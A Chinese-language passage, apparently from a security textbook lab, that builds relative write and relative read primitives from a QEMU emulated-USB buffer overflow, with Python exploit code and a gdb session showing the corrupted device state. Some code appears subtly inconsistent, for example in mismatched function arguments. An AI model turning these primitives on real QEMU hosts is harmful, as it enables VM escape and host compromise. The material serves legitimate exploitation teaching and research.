
我们可以控制 `setup_index` 和 `setup_len` 并始终将 `setup_state` 设置为 `SETUP_STATE_DATA`。请记住数据是以以下方式拷贝的：

```c
usb_packet_copy(p, s->data_buf + s->setup_index, len);
s->setup_index += len;
```

通过控制 `s->setup_index`，我们可以将缓冲区溢出转换为相对于 `s->data_buf` 地址的相对写。根据我们的 `trigger_overflow` 方法，我们可以如下方式构建 `relative_write` 原语（`/labs/qemu_xpl.py`）：

```python
def overflow_data(self):
    return Struct(
        'remote_wakeup' / c.Int32,
        'setup_state' / c.Int32,
        'setup_len' / c.Int32,
        'setup_index' / c.Int32
    )
```

```python
def overflow_build(self, overflow_len, setup_index):
    return self.overflow_data().build({
        'remote_wakeup': 0,
        'setup_state': 2, # SETUP_STATE_DATA
        'setup_len': setup_len,
        'setup_index': setup_index - overflow_len
    })
```

```python
def relative_write(self, offset, data: IOVector):
    data_buf = USBDevice.data_buf.sizeof()
    overflow_len = data_buf + self.overflow_data().sizeof()
    setup_len = data.size() + offset
    self.trigger_overflow(
        overflow_len,
        self.overflow_build(setup_len)
    )
    self.usb_out(data)
```

首先，我们有一个辅助方法 `overflow_build` ① 来构建破坏 `s->setup_len` 和 `setup_index` 的二进制数据。`overflow_len` 参数用于在调用 `usb_packet_copy()` 后调整 `setup_index`。我们的 `relative_write` ③ 原语接收一个相对于 `s->data_buf` 的相对偏移（正或负）以及要写入的数（`IOVector`）。

# 相对读原语

读原语需要发送 IN 包。处理 IN 包的 QEMU 函数是 `do_token_in`（定义在 `/emu/hw/usb/core.c`）：

```c
static void do_token_in(USBDevice *s, USBPacket *p)
{
  ...omitted...
  switch(s->setup_state) {
    ...omitted...
    case SETUP_STATE_DATA:
      if (s->setup_buf[0] & USB_DIR_IN) {
        int len = s->setup_len - s->setup_index;
        if (len > p->iov.size) {
          len = p->iov.size;
        }
        usb_packet_copy(p, s->data_buf + s->setup_index, len);
        s->setup_index += len;
        if (s->setup_index >= s->setup_len) {
          s->setup_state = SETUP_STATE_ACK;
        }
        return;
      }
  }
}
```

如果 `s->setup_buf[0]` 中存在 `USB_DIR_IN`，则到达 `usb_packet_copy` ①。由于我们使用了 OUT 包来破坏 `setup_index`，这是是不可能的。

此时，尝试发送更多 SETUP 包来设置 `USB_DIR_IN` 已经太晚了，因为状态已经被破坏；但是，我们可以向 `relative_write` 传递一个负偏移并破坏 `s->setup_buf`。让我们按照这种方法实现 `relative_read`（`/labs/qemu_xpl.py`）：

```python
def relative_read(self, offset, length):
    data_buf_len = USBDevice.data_buf.sizeof()
    overflow_len = data_buf_len + self.overflow_len
    setup_buf = self.request(ehci.USB_DIR_IN, 0, 0, 0, 0) ②
    setup_buf_len = len(setup_buf)
    data = IOVector([
        Chunk(setup_buf),
        Chunk(
            self.overflow_build(③
            overflow_len,
            offset + length,
            offset - setup_buf_len
        ),
        offset=data_buf_len + setup_buf_len
    ])
    self.relative_write(-setup_buf_len, data)④
    return self.usb_in(length)
```

`relative_read` 原语通过一次性准备数据 ① 同时对 `s->data_buf` 进行下溢和溢出构造。下溢片 (`setup_buf`) ② 破坏 `s->setup_buf` 内容以设置 `USB_DIR_IN`，而溢出切 ③ 破坏 `s->setup_len` 和 `setup_index`。然后使用 `relative_write` ④ 破坏状态，我们现在可以使用一个 IN 包来泄露数据。

# 实验 26-4: 调试相对读原语

让我们使用调试器查看如何实现状态破坏：

```bash
(root@ghh6) - [/labs]
# nohup python3 qemu_xpl.py > /dev/null &
[1] 328
─(root@ghh6) - [/labs]
# gdb -q
(gdb) set pagination off
(gdb) handle SIGUSR1 stop noprint
Signal Stop Print to program Description
SIGUSR1 No No Yes User defined signal 1
(gdb) target remote localhost:2345
0x0000007fc2c3c67090 in _start () target:/lib64/ld-linux-x86-64.so.2
(gdb) b usb_packet_copy if bytes > 0x10000
Breakpoint 1 at 0x5613f085e6a5: file /emu/hw/usb/core.c, line 588
(gdb) c
Continuing...
...omitted...
Thread 1 "qemu-system-x86" hit Breakpoint 1, usb_packet_copy
(p=0x5613f28eb630,
ptr=0x5613f364d09c, bytes=4112) at /emu/hw/usb/core.c:588
588     QEMIOVector *iov = p->combined && p->combined-iov : &p->iov;
```

```
244 s->setup_index += len;
(gdb) print s->setup_state
$1 = 2
(gdb) print s->setup_len
$2 = 4112①
(gdb) print s->setup_index
$3 = -4120②
(gdb) c
```
